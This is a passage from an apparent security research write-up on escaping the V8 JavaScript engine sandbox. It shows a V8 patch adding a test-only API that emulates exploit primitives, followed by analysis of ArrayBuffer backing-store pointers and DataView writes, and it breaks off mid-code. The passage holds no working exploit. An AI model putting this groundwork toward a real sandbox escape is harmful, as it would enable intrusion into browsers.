class="line"><span class="addition">+  # WARNING This will expose builtins that (by design) cause memory corruption.</span></span><br><span class="line"><span class="addition">+  # Sets -DV8_EXPOSE_MEMORY_CORRUPTION_API</span></span><br><span class="line"><span class="addition">+  v8_expose_memory_corruption_api = false</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">   # Experimental feature for collecting per-class zone memory stats.</span><br><span class="line">   # Requires use_rtti = true</span><br><span class="line">   v8_enable_precise_zone_stats = false</span><br><span class="line"><span class="meta">@@ -531,6 +536,9 @@</span> assert(!v8_enable_sandboxed_pointers || v8_enable_sandbox,</span><br><span class="line"> assert(!v8_enable_sandboxed_external_pointers || v8_enable_sandbox,</span><br><span class="line">        &quot;Sandboxed external pointers require the sandbox&quot;)</span><br><span class="line"> </span><br><span class="line"><span class="addition">+assert(!v8_expose_memory_corruption_api || v8_enable_sandbox,</span></span><br><span class="line"><span class="addition">+       &quot;The Memory Corruption API requires the sandbox&quot;)</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> assert(</span><br><span class="line">     !v8_enable_pointer_compression_shared_cage || v8_enable_pointer_compression,</span><br><span class="line">     &quot;Can&#x27;t share a pointer compression cage if pointers aren&#x27;t compressed&quot;)</span><br><span class="line"><span class="meta">@@ -992,6 +1000,9 @@</span> config(&quot;features&quot;) &#123;</span><br><span class="line">   if (v8_fuchsia_use_vmex_resource) &#123;</span><br><span class="line">     defines += [ &quot;V8_USE_VMEX_RESOURCE&quot; ]</span><br><span class="line">   &#125;</span><br><span class="line"><span class="addition">+  if (v8_expose_memory_corruption_api) &#123;</span></span><br><span class="line"><span class="addition">+    defines += [ &quot;V8_EXPOSE_MEMORY_CORRUPTION_API&quot; ]</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> config(&quot;toolchain&quot;) &#123;</span><br><span class="line"><span class="meta">@@ -3369,6 +3380,7 @@</span> v8_header_set(&quot;v8_internal_headers&quot;) &#123;</span><br><span class="line">     &quot;src/sandbox/sandbox.h&quot;,</span><br><span class="line">     &quot;src/sandbox/sandboxed-pointer-inl.h&quot;,</span><br><span class="line">     &quot;src/sandbox/sandboxed-pointer.h&quot;,</span><br><span class="line"><span class="addition">+    &quot;src/sandbox/testing.h&quot;,</span></span><br><span class="line">     &quot;src/snapshot/code-serializer.h&quot;,</span><br><span class="line">     &quot;src/snapshot/context-deserializer.h&quot;,</span><br><span class="line">     &quot;src/snapshot/context-serializer.h&quot;,</span><br><span class="line"><span class="meta">@@ -4397,6 +4409,7 @@</span> v8_source_set(&quot;v8_base_without_compiler&quot;) &#123;</span><br><span class="line">     &quot;src/runtime/runtime.cc&quot;,</span><br><span class="line">     &quot;src/sandbox/external-pointer-table.cc&quot;,</span><br><span class="line">     &quot;src/sandbox/sandbox.cc&quot;,</span><br><span class="line"><span class="addition">+    &quot;src/sandbox/testing.cc&quot;,</span></span><br><span class="line">     &quot;src/snapshot/code-serializer.cc&quot;,</span><br><span class="line">     &quot;src/snapshot/context-deserializer.cc&quot;,</span><br><span class="line">     &quot;src/snapshot/context-serializer.cc&quot;,</span><br><span class="line"><span class="comment">diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index 318afc569e3..2db82fed905 100644</span></span><br><span class="line"><span class="comment">--- a/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -24,6 +24,7 @@</span></span><br><span class="line"> #include &quot;src/logging/runtime-call-stats-scope.h&quot;</span><br><span class="line"> #include &quot;src/objects/instance-type.h&quot;</span><br><span class="line"> #include &quot;src/objects/objects.h&quot;</span><br><span class="line"><span class="addition">+#include &quot;src/sandbox/testing.h&quot;</span></span><br><span class="line"> #ifdef ENABLE_VTUNE_TRACEMARK</span><br><span class="line"> #include &quot;src/extensions/vtunedomain-support-extension.h&quot;</span><br><span class="line"> #endif  // ENABLE_VTUNE_TRACEMARK</span><br><span class="line"><span class="meta">@@ -5769,6 +5770,12 @@</span> bool Genesis::InstallSpecialObjects(Isolate* isolate,</span><br><span class="line">   &#125;</span><br><span class="line"> #endif  // V8_ENABLE_WEBASSEMBLY</span><br><span class="line"> </span><br><span class="line"><span class="addition">+#ifdef V8_EXPOSE_MEMORY_CORRUPTION_API</span></span><br><span class="line"><span class="addition">+  if (GetProcessWideSandbox()-&gt;is_initialized()) &#123;</span></span><br><span class="line"><span class="addition">+    MemoryCorruptionApi::Install(isolate);</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+#endif  // V8_EXPOSE_MEMORY_CORRUPTION_API</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">   return true;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">diff --git a/src/sandbox/sandbox.h b/src/sandbox/sandbox.h</span></span><br><span class="line"><span class="comment">index 20f2343db50..b5300e4d010 100644</span></span><br><span class="line"><span class="comment">--- a/src/sandbox/sandbox.h</span></span><br><span class="line"><span class="comment">+++ b/src/sandbox/sandbox.h</span></span><br><span class="line"><span class="meta">@@ -12,7 +12,6 @@</span></span><br><span class="line"> #include &quot;testing/gtest/include/gtest/gtest_prod.h&quot;  // nogncheck</span><br><span class="line"> </span><br><span class="line"> namespace v8 &#123;</span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"> namespace internal &#123;</span><br><span class="line"> </span><br><span class="line"> #ifdef V8_SANDBOX_IS_AVAILABLE</span><br><span class="line"><span class="comment">diff --git a/src/sandbox/testing.cc b/src/sandbox/testing.cc</span></span><br><span class="line">new file mode 100644</span><br><span class="line"><span class="comment">index 00000000000..753343d9550</span></span><br><span class="line"><span class="comment">--- /dev/null</span></span><br><span class="line"><span class="comment">+++ b/src/sandbox/testing.cc</span></span><br><span class="line"><span class="meta">@@ -0,0 +1,194 @@</span></span><br><span class="line"><span class="addition">+// Copyright 2022 the V8 project authors. All rights reserved.</span></span><br><span class="line"><span class="addition">+// Use of this source code is governed by a BSD-style license that can be</span></span><br><span class="line"><span class="addition">+// found in the LICENSE file.</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#include &quot;src/sandbox/testing.h&quot;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#include &quot;src/api/api-inl.h&quot;</span></span><br><span class="line"><span class="addition">+#include &quot;src/api/api-natives.h&quot;</span></span><br><span class="line"><span class="addition">+#include &quot;src/common/globals.h&quot;</span></span><br><span class="line"><span class="addition">+#include &quot;src/execution/isolate-inl.h&quot;</span></span><br><span class="line"><span class="addition">+#include &quot;src/heap/factory.h&quot;</span></span><br><span class="line"><span class="addition">+#include &quot;src/objects/backing-store.h&quot;</span></span><br><span class="line"><span class="addition">+#include &quot;src/objects/js-objects.h&quot;</span></span><br><span class="line"><span class="addition">+#include &quot;src/objects/templates.h&quot;</span></span><br><span class="line"><span class="addition">+#include &quot;src/sandbox/sandbox.h&quot;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+namespace v8 &#123;</span></span><br><span class="line"><span class="addition">+namespace internal &#123;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#ifdef V8_EXPOSE_MEMORY_CORRUPTION_API</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+namespace &#123;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+// Sandbox.byteLength</span></span><br><span class="line"><span class="addition">+void SandboxGetByteLength(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args) &#123;</span></span><br><span class="line"><span class="addition">+  v8::Isolate* isolate = args.GetIsolate();</span></span><br><span class="line"><span class="addition">+  double sandbox_size = GetProcessWideSandbox()-&gt;size();</span></span><br><span class="line"><span class="addition">+  args.GetReturnValue().Set(v8::Number::New(isolate, sandbox_size));</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+// new Sandbox.MemoryView(args) -&gt; Sandbox.MemoryView</span></span><br><span class="line"><span class="addition">+void SandboxMemoryView(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args) &#123;</span></span><br><span class="line"><span class="addition">+  v8::Isolate* isolate = args.GetIsolate();</span></span><br><span class="line"><span class="addition">+  Local&lt;v8::Context&gt; context = isolate-&gt;GetCurrentContext();</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (!args.IsConstructCall()) &#123;</span></span><br><span class="line"><span class="addition">+    isolate-&gt;ThrowError(&quot;Sandbox.MemoryView must be invoked with &#x27;new&#x27;&quot;);</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Local&lt;v8::Integer&gt; arg1, arg2;</span></span><br><span class="line"><span class="addition">+  if (!args[0]-&gt;ToInteger(context).ToLocal(&amp;arg1) ||</span></span><br><span class="line"><span class="addition">+      !args[1]-&gt;ToInteger(context).ToLocal(&amp;arg2)) &#123;</span></span><br><span class="line"><span class="addition">+    isolate-&gt;ThrowError(&quot;Expects two number arguments (start offset and size)&quot;);</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Sandbox* sandbox = GetProcessWideSandbox();</span></span><br><span class="line"><span class="addition">+  CHECK_LE(sandbox-&gt;size(), kMaxSafeIntegerUint64);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  uint64_t offset = arg1-&gt;Value();</span></span><br><span class="line"><span class="addition">+  uint64_t size = arg2-&gt;Value();</span></span><br><span class="line"><span class="addition">+  if (offset &gt; sandbox-&gt;size() || size &gt; sandbox-&gt;size() ||</span></span><br><span class="line"><span class="addition">+      (offset + size) &gt; sandbox-&gt;size()) &#123;</span></span><br><span class="line"><span class="addition">+    isolate-&gt;ThrowError(</span></span><br><span class="line"><span class="addition">+        &quot;The MemoryView must be entirely contained within the sandbox&quot;);</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Factory* factory = reinterpret_cast&lt;Isolate*&gt;(isolate)-&gt;factory();</span></span><br><span class="line"><span class="addition">+  std::unique_ptr&lt;BackingStore&gt; memory = BackingStore::WrapAllocation(</span></span><br><span class="line"><span class="addition">+      reinterpret_cast&lt;void*&gt;(sandbox-&gt;base() + offset), size,</span></span><br><span class="line"><span class="addition">+      v8::BackingStore::EmptyDeleter, nullptr, SharedFlag::kNotShared);</span></span><br><span class="line"><span class="addition">+  if (!memory) &#123;</span></span><br><span class="line"><span class="addition">+    isolate-&gt;ThrowError(&quot;Out of memory: MemoryView backing store&quot;);</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+  Handle&lt;JSArrayBuffer&gt; buffer = factory-&gt;NewJSArrayBuffer(std::move(memory));</span></span><br><span class="line"><span class="addition">+  args.GetReturnValue().Set(Utils::ToLocal(buffer));</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+// Sandbox.getAddressOf(object) -&gt; Number</span></span><br><span class="line"><span class="addition">+void SandboxGetAddressOf(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args) &#123;</span></span><br><span class="line"><span class="addition">+  v8::Isolate* isolate = args.GetIsolate();</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (args.Length() == 0) &#123;</span></span><br><span class="line"><span class="addition">+    isolate-&gt;ThrowError(&quot;First argument must be provided&quot;);</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Handle&lt;Object&gt; arg = Utils::OpenHandle(*args[0]);</span></span><br><span class="line"><span class="addition">+  if (!arg-&gt;IsHeapObject()) &#123;</span></span><br><span class="line"><span class="addition">+    isolate-&gt;ThrowError(&quot;First argument must be a HeapObject&quot;);</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  // HeapObjects must be allocated inside the pointer compression cage so their</span></span><br><span class="line"><span class="addition">+  // address relative to the start of the sandbox can be obtained simply by</span></span><br><span class="line"><span class="addition">+  // taking the lowest 32 bits of the absolute address.</span></span><br><span class="line"><span class="addition">+  uint32_t address = static_cast&lt;uint32_t&gt;(HeapObject::cast(*arg).address());</span></span><br><span class="line"><span class="addition">+  args.GetReturnValue().Set(v8::Integer::NewFromUnsigned(isolate, address));</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+// Sandbox.getSizeOf(object) -&gt; Number</span></span><br><span class="line"><span class="addition">+void SandboxGetSizeOf(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args) &#123;</span></span><br><span class="line"><span class="addition">+  v8::Isolate* isolate = args.GetIsolate();</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (args.Length() == 0) &#123;</span></span><br><span class="line"><span class="addition">+    isolate-&gt;ThrowError(&quot;First argument must be provided&quot;);</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Handle&lt;Object&gt; arg = Utils::OpenHandle(*args[0]);</span></span><br><span class="line"><span class="addition">+  if (!arg-&gt;IsHeapObject()) &#123;</span></span><br><span class="line"><span class="addition">+    isolate-&gt;ThrowError(&quot;First argument must be a HeapObject&quot;);</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  int size = HeapObject::cast(*arg).Size();</span></span><br><span class="line"><span class="addition">+  args.GetReturnValue().Set(v8::Integer::New(isolate, size));</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+Handle&lt;FunctionTemplateInfo&gt; NewFunctionTemplate(</span></span><br><span class="line"><span class="addition">+    Isolate* isolate, FunctionCallback func,</span></span><br><span class="line"><span class="addition">+    ConstructorBehavior constructor_behavior) &#123;</span></span><br><span class="line"><span class="addition">+  // Use the API functions here as they are more convenient to use.</span></span><br><span class="line"><span class="addition">+  v8::Isolate* api_isolate = reinterpret_cast&lt;v8::Isolate*&gt;(isolate);</span></span><br><span class="line"><span class="addition">+  Local&lt;FunctionTemplate&gt; function_template =</span></span><br><span class="line"><span class="addition">+      FunctionTemplate::New(api_isolate, func, &#123;&#125;, &#123;&#125;, 0, constructor_behavior,</span></span><br><span class="line"><span class="addition">+                            SideEffectType::kHasSideEffect);</span></span><br><span class="line"><span class="addition">+  return v8::Utils::OpenHandle(*function_template);</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+Handle&lt;JSFunction&gt; CreateFunc(Isolate* isolate, FunctionCallback func,</span></span><br><span class="line"><span class="addition">+                              Handle&lt;String&gt; name, bool is_constructor) &#123;</span></span><br><span class="line"><span class="addition">+  ConstructorBehavior constructor_behavior = is_constructor</span></span><br><span class="line"><span class="addition">+                                                 ? ConstructorBehavior::kAllow</span></span><br><span class="line"><span class="addition">+                                                 : ConstructorBehavior::kThrow;</span></span><br><span class="line"><span class="addition">+  Handle&lt;FunctionTemplateInfo&gt; function_template =</span></span><br><span class="line"><span class="addition">+      NewFunctionTemplate(isolate, func, constructor_behavior);</span></span><br><span class="line"><span class="addition">+  return ApiNatives::InstantiateFunction(function_template, name)</span></span><br><span class="line"><span class="addition">+      .ToHandleChecked();</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+void InstallFunc(Isolate* isolate, Handle&lt;JSObject&gt; holder,</span></span><br><span class="line"><span class="addition">+                 FunctionCallback func, const char* name, int num_parameters,</span></span><br><span class="line"><span class="addition">+                 bool is_constructor) &#123;</span></span><br><span class="line"><span class="addition">+  Factory* factory = isolate-&gt;factory();</span></span><br><span class="line"><span class="addition">+  Handle&lt;String&gt; function_name = factory-&gt;NewStringFromAsciiChecked(name);</span></span><br><span class="line"><span class="addition">+  Handle&lt;JSFunction&gt; function =</span></span><br><span class="line"><span class="addition">+      CreateFunc(isolate, func, function_name, is_constructor);</span></span><br><span class="line"><span class="addition">+  function-&gt;shared().set_length(num_parameters);</span></span><br><span class="line"><span class="addition">+  JSObject::AddProperty(isolate, holder, function_name, function, NONE);</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+void InstallGetter(Isolate* isolate, Handle&lt;JSObject&gt; object,</span></span><br><span class="line"><span class="addition">+                   FunctionCallback func, const char* name) &#123;</span></span><br><span class="line"><span class="addition">+  Factory* factory = isolate-&gt;factory();</span></span><br><span class="line"><span class="addition">+  Handle&lt;String&gt; property_name = factory-&gt;NewStringFromAsciiChecked(name);</span></span><br><span class="line"><span class="addition">+  Handle&lt;JSFunction&gt; getter = CreateFunc(isolate, func, property_name, false);</span></span><br><span class="line"><span class="addition">+  Handle&lt;Object&gt; setter = factory-&gt;null_value();</span></span><br><span class="line"><span class="addition">+  JSObject::DefineAccessor(object, property_name, getter, setter, FROZEN);</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+void InstallFunction(Isolate* isolate, Handle&lt;JSObject&gt; holder,</span></span><br><span class="line"><span class="addition">+                     FunctionCallback func, const char* name,</span></span><br><span class="line"><span class="addition">+                     int num_parameters) &#123;</span></span><br><span class="line"><span class="addition">+  InstallFunc(isolate, holder, func, name, num_parameters, false);</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+void InstallConstructor(Isolate* isolate, Handle&lt;JSObject&gt; holder,</span></span><br><span class="line"><span class="addition">+                        FunctionCallback func, const char* name,</span></span><br><span class="line"><span class="addition">+                        int num_parameters) &#123;</span></span><br><span class="line"><span class="addition">+  InstallFunc(isolate, holder, func, name, num_parameters, true);</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+&#125;  // namespace</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+// static</span></span><br><span class="line"><span class="addition">+void MemoryCorruptionApi::Install(Isolate* isolate) &#123;</span></span><br><span class="line"><span class="addition">+  CHECK(GetProcessWideSandbox()-&gt;is_initialized());</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Factory* factory = isolate-&gt;factory();</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  // Create the special Sandbox object that provides read/write access to the</span></span><br><span class="line"><span class="addition">+  // sandbox address space alongside other miscellaneous functionality.</span></span><br><span class="line"><span class="addition">+  Handle&lt;JSObject&gt; sandbox =</span></span><br><span class="line"><span class="addition">+      factory-&gt;NewJSObject(isolate-&gt;object_function(), AllocationType::kOld);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  InstallGetter(isolate, sandbox, SandboxGetByteLength, &quot;byteLength&quot;);</span></span><br><span class="line"><span class="addition">+  InstallConstructor(isolate, sandbox, SandboxMemoryView, &quot;MemoryView&quot;, 2);</span></span><br><span class="line"><span class="addition">+  InstallFunction(isolate, sandbox, SandboxGetAddressOf, &quot;getAddressOf&quot;, 1);</span></span><br><span class="line"><span class="addition">+  InstallFunction(isolate, sandbox, SandboxGetSizeOf, &quot;getSizeOf&quot;, 1);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  // Install the Sandbox object as property on the global object.</span></span><br><span class="line"><span class="addition">+  Handle&lt;JSGlobalObject&gt; global = isolate-&gt;global_object();</span></span><br><span class="line"><span class="addition">+  Handle&lt;String&gt; name = factory-&gt;NewStringFromAsciiChecked(&quot;Sandbox&quot;);</span></span><br><span class="line"><span class="addition">+  JSObject::AddProperty(isolate, global, name, sandbox, DONT_ENUM);</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#endif  // V8_EXPOSE_MEMORY_CORRUPTION_API</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+&#125;  // namespace internal</span></span><br><span class="line"><span class="addition">+&#125;  // namespace v8</span></span><br><span class="line"><span class="comment">diff --git a/src/sandbox/testing.h b/src/sandbox/testing.h</span></span><br><span class="line">new file mode 100644</span><br><span class="line"><span class="comment">index 00000000000..4ab7637702d</span></span><br><span class="line"><span class="comment">--- /dev/null</span></span><br><span class="line"><span class="comment">+++ b/src/sandbox/testing.h</span></span><br><span class="line"><span class="meta">@@ -0,0 +1,28 @@</span></span><br><span class="line"><span class="addition">+// Copyright 2022 the V8 project authors. All rights reserved.</span></span><br><span class="line"><span class="addition">+// Use of this source code is governed by a BSD-style license that can be</span></span><br><span class="line"><span class="addition">+// found in the LICENSE file.</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#ifndef V8_SANDBOX_TESTING_H_</span></span><br><span class="line"><span class="addition">+#define V8_SANDBOX_TESTING_H_</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#include &quot;src/common/globals.h&quot;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+namespace v8 &#123;</span></span><br><span class="line"><span class="addition">+namespace internal &#123;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#ifdef V8_EXPOSE_MEMORY_CORRUPTION_API</span></span><br><span class="line"><span class="addition">+// A JavaScript API that emulates typical exploit primitives.</span></span><br><span class="line"><span class="addition">+//</span></span><br><span class="line"><span class="addition">+// This can be used for testing the sandbox, for example to write regression</span></span><br><span class="line"><span class="addition">+// tests for bugs in the sandbox or to develop fuzzers.</span></span><br><span class="line"><span class="addition">+class MemoryCorruptionApi &#123;</span></span><br><span class="line"><span class="addition">+ public:</span></span><br><span class="line"><span class="addition">+  V8_EXPORT_PRIVATE static void Install(Isolate* isolate);</span></span><br><span class="line"><span class="addition">+&#125;;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#endif  // V8_EXPOSE_MEMORY_CORRUPTION_API</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+&#125;  // namespace internal</span></span><br><span class="line"><span class="addition">+&#125;  // namespace v8</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#endif  // V8_SANDBOX_TESTING_H_</span></span><br></pre></td></tr></table></figure>

<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Backing-store-of-ArrayBuffer"><a href="#Backing-store-of-ArrayBuffer" class="headerlink" title="Backing store of ArrayBuffer"></a>Backing store of ArrayBuffer</h3><p>The <a target="_blank" rel="noopener" href="https://developer.mozilla.org/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer"><code>ArrayBuffer</code></a> object in JavaScript is managed by <code>JSArrayBuffer</code> class.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* src/objects/js-array-buffer.tq:14-24 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">class</span> <span class="title class_">JSArrayBuffer</span> extends JSObject &#123;</span><br><span class="line">  byte_length: uintptr;</span><br><span class="line">  max_byte_length: uintptr;</span><br><span class="line">  <span class="comment">// A SandboxedPtr if the sandbox is enabled</span></span><br><span class="line">  backing_store: RawPtr;</span><br><span class="line">  extension: RawPtr;</span><br><span class="line">  bit_field: JSArrayBufferFlags;</span><br><span class="line">  <span class="comment">// Pads header size to be a multiple of kTaggedSize.</span></span><br><span class="line">  @<span class="keyword">if</span>(TAGGED_SIZE_8_BYTES) optional_padding: uint32;</span><br><span class="line">  @ifnot(TAGGED_SIZE_8_BYTES) optional_padding: <span class="type">void</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>JSArrayBuffer</code> has a pointer named <code>backing_store</code> pointing to the memory containing the actual value stored in the <code>ArrayBuffer</code>.</p>
<p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/1.png"></p>
<p>We have to use <a target="_blank" rel="noopener" href="https://developer.mozilla.org/docs/Web/JavaScript/Reference/Global_Objects/TypedArray"><code>TypedArray</code></a> or <a target="_blank" rel="noopener" href="https://developer.mozilla.org/docs/Web/JavaScript/Reference/Global_Objects/DataView"><code>DataView</code></a> to access the values stored in an <code>ArrayBuffer</code>. For example, we can store an 8-byte value with <a target="_blank" rel="noopener" href="https://developer.mozilla.org/docs/Web/JavaScript/Reference/Global_Objects/DataView/setBigUint64"><code>DataView.prototype.setBigUint64()</code></a>, which is managed by <code>DataViewPrototypeSetBigUint64()</code>.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* src/builtins/data-view.tq:869-877 */</span></span><br><span class="line"></span><br><span class="line"><span class="function">transitioning javascript builtin <span class="title">DataViewPrototypeSetBigUint64</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    js-implicit context: NativeContext, receiver: JSAny)</span><span class="params">(...arguments)</span>: JSAny &#123;</span></span><br><span class="line">  <span class="type">const</span> offset: JSAny = arguments[<span class="number">0</span>];</span><br><span class="line">  <span class="type">const</span> value: JSAny = arguments[<span class="number">1</span>];</span><br><span class="line">  <span class="type">const</span> isLittleEndian: JSAny = arguments[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">DataViewSet</span>(</span><br><span class="line">      context, receiver, offset, value, isLittleEndian,</span><br><span class="line">      ElementsKind::BIGUINT64_ELEMENTS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>DataViewPrototypeSetBigUint64()</code> gets into <a target="_blank" rel="noopener" href="https://source.chromium.org/chromium/v8/v8/+/0ac7e1203fcb957851887fb140dc8a41139846a5:src/builtins/data-view.tq;l=874"><code>DataViewSet()</code></a> → <a target="_blank" rel="noopener" href="https://source.chromium.org/chromium/v8/v8/+/0ac7e1203fcb957851887fb140dc8a41139846a5:src/builtins/data-view.tq;l=752"><code>StoreDataViewBigInt()</code></a> → <a target="_blank" rel="noopener" href="https://source.chromium.org/chromium/v8/v8/+/0ac7e1203fcb957851887fb140dc8a41139846a5:src/builtins/data-view.tq;l=668"><code>StoreDataView64()</code></a>.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* src/builtins/data-view.tq:590-624 */</span></span><br><span class="line"></span><br><span class="line"><span class="function">macro <span class="title">StoreDataView64</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    buffer: JSArrayBuffer, offset: uintptr, lowWord: uint32, highWord: uint32,</span></span></span><br><span class="line"><span class="params"><span class="function">    requestedLittleEndian: <span class="type">bool</span>)</span>: void &#123;</span></span><br><span class="line">  <span class="type">const</span> dataPointer: RawPtr = buffer.backing_store_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> b0: uint32 = lowWord &amp; <span class="number">0xFF</span>;</span><br><span class="line">  <span class="type">const</span> b1: uint32 = (lowWord &gt;&gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">  <span class="type">const</span> b2: uint32 = (lowWord &gt;&gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">  <span class="type">const</span> b3: uint32 = lowWord &gt;&gt;&gt; <span class="number">24</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> b4: 